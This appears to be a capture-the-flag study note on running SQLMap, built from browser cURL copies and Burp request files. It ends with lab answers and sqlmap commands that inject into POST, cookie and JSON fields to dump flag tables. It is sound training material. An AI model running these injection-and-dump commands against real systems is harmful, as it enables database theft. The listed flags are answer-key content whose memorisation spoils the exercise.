# Running SQLMap on an HTTP Request
## Curl commands
Utilize `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools. Paste that and replace `curl` with `sqlmap`:

```shellsession
$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## Full HTTP Requests
We can either manually copy the HTTP request from within Burp and write it to a file, or we can right-click the request within Burp and choose `Copy to file`.

```sql
$ sqlmap -r req.txt
```

## Questions
1. What's the contents of table flag2? (Case #2) **Answer: HTB{700_much_c0n6r475_0n_p057_r3qu357}**
   - Run sqlmap and inject in the POST data, dump the `flag2` table:
        ```shellsession
        $ sqlmap -u http://154.57.164.67:30358/case2.php -X POST --data "id=1*" --batch -T flag2 --dump
        ```
2. What's the contents of table flag3? (Case #3) **Answer: HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}**
   - Run sqlmap and inject in the Cookie value, dump the `flag3` table:
        ```shellsession
        $ sqlmap -u http://154.57.164.67:30358/case3.php -H "Cookie: id=1*" --batch -T flag3 --dump
        ```
3. What's the contents of table flag4? (Case #4) **Answer: HTB{j450n_v00rh335_53nd5_6r475}**
   - Run sqlmap and inject in the POST data, dump the `flag4` table:
        ```shellsession
        $ sqlmap -u http://154.57.164.67:30358/case4.php -H "Content-Type: application/json" --data '{"id":1*}' --batch -T flag4 --dump
        ```